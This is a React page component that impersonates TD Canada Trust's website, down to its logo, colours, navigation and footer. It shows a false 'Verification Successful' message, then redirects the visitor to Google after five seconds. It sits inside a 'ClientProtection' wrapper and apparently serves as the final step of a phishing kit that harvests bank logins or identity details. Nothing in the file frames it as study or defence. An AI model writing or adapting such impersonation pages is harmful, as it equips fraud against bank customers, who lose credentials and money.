"use client";

import { useState, useEffect } from "react";
import ClientProtection from "../../components/ClientProtection";

export default function ThankYouPage() {
  const [countdown, setCountdown] = useState(5); // 5 seconds
  const [showCheckmark, setShowCheckmark] = useState(false);

  useEffect(() => {
    // Show checkmark animation after component mounts
    setTimeout(() => setShowCheckmark(true), 500);

    // Countdown timer
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          // Redirect to Google when countdown reaches 0
          window.location.href = "https://www.google.com";
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Format countdown as MM:SS
  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, "0")}`;
  };

  return (
    <ClientProtection>
      <div className="min-h-screen bg-white">
        {/* Header - Hidden on mobile */}
        <header className="bg-white border-b border-gray-200 hidden md:block">
          <div className="max-w-7xl mx-auto px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <img src="/logo.png" alt="TD Logo" className="h-8" />
                <span className="text-lg font-medium text-gray-800">
                  TD Canada Trust
                </span>
              </div>
              <div className="flex items-center space-x-4 text-sm text-gray-600">
                <a href="#" className="hover:text-gray-800">
                  English
                </a>
                <span>|</span>
                <a href="#" className="hover:text-gray-800">
                  Français
                </a>
              </div>
            </div>
          </div>
        </header>

        {/* Main Header */}
        <header className="bg-[#12412a] text-white">
          <div className="max-w-7xl mx-auto px-4 py-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                {/* Mobile hamburger menu */}
                <button className="md:hidden text-white">
                  <svg
                    className="w-6 h-6"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M4 6h16M4 12h16M4 18h16"
                    />
                  </svg>
                </button>
                <img src="/logo.png" alt="TD" className="h-8 md:h-10" />
                <nav className="hidden md:flex space-x-6">
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Personal
                  </a>
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Small Business
                  </a>
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Commercial
                  </a>
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Wealth
                  </a>
                </nav>
              </div>
              <div className="flex items-center space-x-4">
                {/* Desktop links - hidden on mobile */}
                <div className="hidden md:flex items-center space-x-4">
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Contact Us
                  </a>
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Find a Branch
                  </a>
                </div>

                {/* Login button - always visible */}
                <button className="flex items-center space-x-1 text-white hover:text-green-300 transition-colors">
                  <svg
                    className="w-4 h-4"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <span className="font-medium text-sm">Login</span>
                </button>
              </div>
            </div>
          </div>
        </header>

        {/* Main Content */}
        <div className="bg-gray-50 py-6 md:py-12">
          <div className="max-w-4xl mx-auto px-4">
            <h1
              className="text-[24px] md:text-[32px] leading-[32px] md:leading-[40px] font-normal text-[#12412a] mb-6 md:mb-8 text-center"
              style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
            >
              Authentication Complete
            </h1>

            <div className="max-w-md mx-auto bg-[#f6fbf8] border border-[#e1eee7] rounded-lg p-4 md:p-8 text-center">
              {/* Animated Checkmark */}
              <div className="mb-8">
                <div
                  className={`mx-auto w-20 h-20 rounded-full bg-green-100 flex items-center justify-center transition-all duration-1000 ${
                    showCheckmark
                      ? "scale-100 opacity-100"
                      : "scale-50 opacity-0"
                  }`}
                >
                  <svg
                    className={`w-10 h-10 text-green-600 transition-all duration-1000 delay-300 ${
                      showCheckmark
                        ? "scale-100 opacity-100"
                        : "scale-0 opacity-0"
                    }`}
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={3}
                      d="M5 13l4 4L19 7"
                      className="animate-draw-check"
                    />
                  </svg>
                </div>
              </div>

              {/* Success Message */}
              <h2
                className="text-xl font-normal text-gray-800 mb-4"
                style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
              >
                Verification Successful!
              </h2>

              <p className="text-gray-700 mb-8 leading-relaxed text-[15px]">
                Your identity has been successfully verified. Thank you for
                using our secure authentication system.
              </p>

              {/* Redirect Information */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-6">
                <div className="flex items-center justify-center mb-3">
                  <svg
                    className="animate-spin w-5 h-5 text-green-500 mr-2"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 714 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  <span className="text-green-700 font-medium">
                    Automatically redirecting ...
                  </span>
                </div>

                <div className="text-center">
                  <div className="text-2xl font-mono font-bold text-green-800 mb-2">
                    {countdown}
                  </div>
                  <div className="text-sm text-green-600">
                    You will be automatically redirected in {countdown} seconds
                  </div>
                </div>
              </div>

              {/* Manual Redirect Button */}
              <div className="flex justify-center">
                <button
                  onClick={() =>
                    (window.location.href = "https://www.google.com")
                  }
                  className="px-10 h-[48px] font-medium text-[16px] bg-[#187a3b] text-white hover:bg-[#166b34] transition-colors flex items-center justify-center gap-2 rounded-md shadow-sm"
                >
                  <svg
                    className="w-4 h-4"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z"
                      clipRule="evenodd"
                    />
                  </svg>
                  Continue Now
                </button>
              </div>

              {/* Security Notice */}
              <p className="text-xs text-gray-500 mt-6 leading-relaxed">
                For your security, this session will automatically redirect you
                to Google. Please do not share this confirmation with anyone.
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="bg-[#12412a] text-white">
          <div className="max-w-7xl mx-auto px-4 py-6">
            {/* Top Section - Image + Contact and Social Media */}
            <div className="flex flex-col md:flex-row justify-center items-center mb-4">
              <div className="flex flex-col md:flex-row items-center gap-4 md:gap-6">
                <div className="flex-shrink-0 hidden md:block">
                  <img
                    src="/footer_seat.png"
                    alt="Chair"
                    className="h-48 w-auto"
                  />
                </div>
                <div className="text-center">
                  <p className="text-lg mb-2">
                    Need to talk to us directly?{" "}
                    <a
                      href="#"
                      className="text-green-300 hover:text-green-200 inline-flex items-center font-medium"
                    >
                      Contact us{" "}
                      <svg
                        className="w-4 h-4 ml-1"
                        fill="currentColor"
                        viewBox="0 0 20 20"
                      >
                        <path
                          fillRule="evenodd"
                          d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </a>
                  </p>

                  <p className="text-lg mb-4">Connect with TD</p>
                  <div className="flex justify-center space-x-4 mb-4">
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.402.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.357-.629-2.746-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24.009 12.017 24.009c6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001.012.001z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" />
                      </svg>
                    </a>
                  </div>
                </div>
              </div>
            </div>

            {/* Bottom Section - Privacy Links */}
            <div className="pt-2">
              <div className="flex flex-wrap justify-center gap-6 text-sm w-full">
                <a href="#" className="hover:text-green-300 transition-colors">
                  Privacy and Security
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Legal
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Accessibility
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  CDIC member
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  About Us
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  We&apos;re Hiring
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Manage online experience
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Site Index
                </a>
              </div>

              {/* Mobile armchair - shown at bottom on mobile only */}
              <div className="flex justify-center md:hidden mt-4">
                <img
                  src="/footer_seat.png"
                  alt="Chair"
                  className="h-32 w-auto"
                />
              </div>
            </div>
          </div>
        </footer>
      </div>

      <style jsx>{`
        @keyframes draw-check {
          0% {
            stroke-dasharray: 0 100;
          }
          100% {
            stroke-dasharray: 100 0;
          }
        }

        .animate-draw-check {
          stroke-dasharray: 100;
          animation: draw-check 0.8s ease-in-out 0.5s forwards;
        }
      `}</style>
    </ClientProtection>
  );
}
